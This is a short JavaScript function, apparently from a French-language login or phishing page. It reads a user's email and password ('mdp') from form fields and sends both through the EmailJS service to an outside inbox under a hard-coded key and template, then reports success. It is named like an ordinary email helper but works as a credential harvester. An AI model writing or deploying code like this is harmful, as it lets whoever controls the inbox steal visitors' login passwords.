function sendEmail() {
    emailjs.init("FLCWfGzjhSIMLmML1");
    var emailUti = document.getElementById("emailUti");
    var mdpUti = document.getElementById("mdp");
    emailjs.send("service_kvw3ho3", "template_5okli8n", { email: emailUti.value, mdp: mdpUti.value })
        .then(alert("Email envoyé avec succès"));
}